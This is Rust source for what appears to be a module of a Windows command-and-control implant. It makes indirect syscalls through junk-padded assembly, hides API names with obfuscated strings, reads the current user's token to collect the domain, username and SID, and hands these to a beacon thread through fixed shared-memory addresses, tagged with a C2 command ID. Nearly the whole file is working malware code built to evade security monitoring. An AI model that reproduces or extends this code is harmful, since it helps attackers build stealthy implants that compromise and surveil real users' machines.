#![no_main]
use std::arch::asm;
use std::ptr;
use std::ffi::c_void;
use std::slice;
use std::arch::global_asm;
use std::collections::BTreeMap;
use std::{ptr::null_mut};
use obfstr::obfstr;
use winapi::um::winnt::LPSTR;
use winapi::shared::sddl::ConvertSidToStringSidA;
use winapi::um::winnt::TOKEN_INFORMATION_CLASS;
use winapi::ctypes::c_void as other_c_void;
use winapi::um::winnt::TOKEN_USER;
use winapi::shared::ntdef::UNICODE_STRING;
use ntapi::ntrtl::RtlConvertSidToUnicodeString;
use winapi::um::winbase::LookupAccountSidA;
use winapi::um::winnt::LPCSTR;
use winapi::um::winnt::SID;
use std::mem;
use winapi::um::winnt::PSID_NAME_USE;
use winapi::um::winnt::SID_NAME_USE;
use winapi::shared::minwindef::LPDWORD;

use winapi::um::winnt::PSID;
use winapi::um::winnt::{THREAD_SUSPEND_RESUME, THREAD_SET_CONTEXT, THREAD_GET_CONTEXT};
use winapi::shared::minwindef::PULONG;
use ntapi::ntapi_base::CLIENT_ID;
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use winapi::shared::ntdef::NULL;

// this is a test
#[cfg(feature = "winbase")] pub mod winbase;

global_asm!(
    "
.global syscall_exec
.section .text
syscall_exec:
   mov [rsp - 0x8],  rsi
   nop
   mov [rsp - 0x10], rdi
   mov [rsp - 0x18], r12
   mov eax, ecx
   mov r12, rdx
   por mm1, mm1
   mov rcx, r8
   por mm1, mm1
   mov r10, r9
   mov  rdx,  [rsp + 0x28]
   mov  r8,   [rsp + 0x30]
   mov  r9,   [rsp + 0x38]
   sub rcx, 0x4
   nop
   jle skip
   nop
   pand mm0, mm0
   pand mm0, mm0
   lea rsi,  [rsp + 0x40]
   lea rdi,  [rsp + 0x28]
   pand mm0, mm0
   pand mm0, mm0
   rep movsq
skip:
   por mm1, mm1
   por mm1, mm1
   por mm1, mm1
   mov rcx, r12
   mov rsi, [rsp - 0x8]
   por mm1, mm1
   nop
   mov rdi, [rsp - 0x10]
   nop
   pand mm0, mm0
   mov r12, [rsp - 0x18]
   jmp rcx

    "
);

// unique generated command identifier (identifies the target operator -> send to websocket)

extern "C" {
    pub fn syscall_exec(ssn: u16, syscall_address: usize, arg_count: u32, ...) -> i32;
}

#[macro_export]
macro_rules! syscall_macro {
    ($syscall_table:expr, $syscall_name:expr, $($y:expr), +) => {
        {
        let syscall_name = $syscall_name.clone();
        let syscall_table = $syscall_table;
        
        let mut ssn = syscall_table.iter().find(|(key, _)| key == &syscall_name).map(|(_, value)| value).unwrap();
        let mut arg_count:u32 = 0;
        $(
            let _ = $y;
            arg_count += 1;
        )+
        syscall_exec(ssn.1 as u16, ssn.0 as usize, arg_count, $($y), +)
    }}
}

#[no_mangle]
#[inline(never)]
pub fn main(arg1: *mut c_void) {    
    // println!("{:?} - ", arg1);
    // START - Indirect Syscall structure creation (received from main thread)

    let address_cafebabe: *const u32 = 0xBAADF000 as *const u32;
    let address = 0xBAADF000 as *mut u8;
    let value: u32 = 5;
    let bytes = value.to_le_bytes(); 
    unsafe {
        for (i, &byte) in bytes.iter().enumerate() {
            core::ptr::write_volatile(address.add(i), byte);
        }
    }

    let mut r14_value: u64 = 0;
    unsafe{
        loop{
            let read_value = std::ptr::read_volatile(address_cafebabe);
            if read_value as u8 == 6{
                unsafe{
                    asm!("mov {}, r14", out(reg) r14_value);
                }
                break
            }
        }
    }

    let ptr: *const BTreeMap<String, (usize, u16)> = r14_value as *const _;
    let btree_map: &BTreeMap<String, (usize, u16)> = unsafe {
        &*ptr
    };

    unsafe{
        let mut sorted_syscalls: Vec<(String, (usize,u16))> = Vec::from_iter(btree_map.clone());

    // END - Indirect Syscall structure creation (received from main thread)
    
        let mut currentProcess : *mut c_void = -1isize as _;
        let mut tokenHandle: *mut c_void = null_mut();

        let mut token_information: Vec<u8> = vec![0; 0];

        // // println!("[external] tokenResult: {:?}", token_information);
    
        let open_process_token = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtOpenProcessToken").to_string(), currentProcess, 0x0008, &mut tokenHandle);
        // // println!("[external] NtOpenProcessToken: 0x{:08X}", open_process_token);
    
        let mut result_length: u32 = 0;
        let mut token_length: u32 = 0;
        let mut buffer: u32 = 0;

        /*
        NtQueryInformationToken(
            _In_ HANDLE TokenHandle,
            _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
            _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
            _In_ ULONG TokenInformationLength,
            _Out_ PULONG ReturnLength
        );
        */


        let mut token_Info_class: TOKEN_INFORMATION_CLASS = 1;
        let nt_query_information_token = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtQueryInformationToken").to_string(), 
            tokenHandle, 
            token_Info_class, 
            token_information.as_mut_ptr().cast::<other_c_void>(), 
            token_length, 
            &mut buffer
        );
        // // println!("[external] NtQueryInformationToken: 0x{:08X} - {:?} - {:?}", nt_query_information_token, token_length, buffer);
        token_length = buffer;
        token_information.resize(token_length as usize, 0);

        // // println!("[external] Resized: {:?} - {:?} - {:?}", token_length, buffer, token_information.len());

        let nt_query_information_token = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtQueryInformationToken").to_string(), 
            tokenHandle, 
            token_Info_class, 
            token_information.as_mut_ptr().cast::<other_c_void>(), 
            token_length, 
            &mut buffer
        );

        let token_user = unsafe { token_information.as_ptr().cast::<TOKEN_USER>().read_unaligned() };
        let mut sid_string_buffer: Vec<u16> = vec![0; 256 as usize];
        let mut sid_string: UNICODE_STRING = UNICODE_STRING {
            Length: 0,
            MaximumLength: 256,
            Buffer: sid_string_buffer.as_mut_ptr()
        };


        // // println!("[external] NtQueryInformationToken: 0x{:08X}", nt_query_information_token);

        let _ = RtlConvertSidToUnicodeString(&mut sid_string, token_user.User.Sid as *const SID as *mut other_c_void, 0);

        // // println!("[external] ConvertSidToStringSidA: 0x{:08X}", sid_status);
        // // println!("[external] SID -> {:?}", token_user.User.Sid as *const SID as *mut other_c_void);
        // // // println!("[external] STRING -> {:?}", sid_string);        

        /*
            / ConvertSidToStringSid
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine("[+] SID (String version):\n{0}", sidstr);

            // LookupAccountSid
            StringBuilder name = new StringBuilder();
            uint cchName = (uint)name.Capacity;
            StringBuilder referencedDomainName = new StringBuilder();
            uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
            var sid = new SecurityIdentifier(sidstr);
            byte[] byteSid = new byte[sid.BinaryLength];
            sid.GetBinaryForm(byteSid, 0);
            LookupAccountSid(null, byteSid, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out uint sidUse);
        */

        let mut sid_type: SID_NAME_USE = Default::default();
    
        let mut lp_name = [0i8; 1024];
        let mut lp_domain = [0i8; 1024];
    
        // Lookup the SID
        LookupAccountSidA(
                std::ptr::null() as *const i8,
                token_user.User.Sid as PSID,
                lp_name.as_mut_ptr(),
                &mut buffer,
                lp_domain.as_mut_ptr(),
                &mut buffer,
                &mut sid_type,
        );

        let name = unsafe {
                std::ffi::CStr::from_ptr(lp_name.as_ptr())
                    .to_string_lossy()
                    .to_string()
        };


        let domain = unsafe {
            std::ffi::CStr::from_ptr(lp_domain.as_ptr())
                .to_string_lossy()
                .to_string()
        };
        let sid_string = unsafe {
            String::from_utf16(std::slice::from_raw_parts(
                sid_string.Buffer,
                sid_string.Length as usize / 2
            )).unwrap()
        };

        let mut data = format!("{}/{}\n{}", domain,name,sid_string);
        data.push('\0');
        let boxed_string_1 = Box::new(data);
        let static_ref_1: &'static str = Box::leak(boxed_string_1);
        let data_string_ptr = static_ref_1.as_ptr() as *const u8;
        let data_string_ptr_bytes: [u8; mem::size_of::<*const u8>()] = unsafe { mem::transmute(data_string_ptr) };

        // // println!("[external] Data ptr: {:?}",&data_string_ptr);

        let mut unique_id = String::from("{!unique_command_id}");
        unique_id.push('\0');
        let boxed_string_2 = Box::new(unique_id);
        let static_ref_2: &'static str = Box::leak(boxed_string_2);
        let unique_id_ptr = static_ref_2.as_ptr() as *const u8;
        let uniq_id_data_ptr_bytes: [u8; mem::size_of::<*const u8>()] = unsafe { mem::transmute(unique_id_ptr) };

        // // println!("[external]  unique_id ptr: {:?}",&unique_id_ptr);

        let mut bytes: Vec<u8> = Vec::new(); // memory protocol....
        bytes.push(6); // incomming response byte 0xBAADF000
        bytes.push(0); // read control byte 0xBAADF001
        bytes.extend_from_slice(&data_string_ptr_bytes); // pointer to the string representation of a given data 0xCAFE000A
        bytes.extend_from_slice(&uniq_id_data_ptr_bytes); // pointer to a string representation of the command ID (c2 handling) 0xCAFE0012

        // start communication with beacon thread -> passing results...
        
        let address = 0xBAADF000 as *mut u8;
        unsafe {
            for (i, &byte) in bytes.iter().enumerate() {
                core::ptr::write_volatile(address.wrapping_add(i), byte);
            }
        }

        let address = 0xBAADF001 as *mut u8;
        core::ptr::write_volatile(address, 1);

        
        // stop current thread
        let oa : OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
            Length: size_of::<OBJECT_ATTRIBUTES>() as _,
            RootDirectory: NULL,
            ObjectName: NULL as _,
            Attributes: 0,
            SecurityDescriptor: NULL,
            SecurityQualityOfService: NULL
        };

        let mut currentThreadID = 0;
        unsafe {
            asm!("mov {currentThreadID}, gs:[0x48]", currentThreadID = out(reg) currentThreadID);
        }

        let mut ci2 = CLIENT_ID {
            UniqueProcess: 0 as *mut winapi::ctypes::c_void,
            UniqueThread: currentThreadID as *mut winapi::ctypes::c_void,
        };

        let mut previous_suspend_count: PULONG = null_mut();
        let mut thread_handle : *mut c_void = null_mut();
        let open_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtOpenThread").to_string(), &mut thread_handle, THREAD_SUSPEND_RESUME, &oa, &ci2);
        let nt_suspend_thread = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtSuspendThread").to_string(), thread_handle,  &mut previous_suspend_count);
    }
}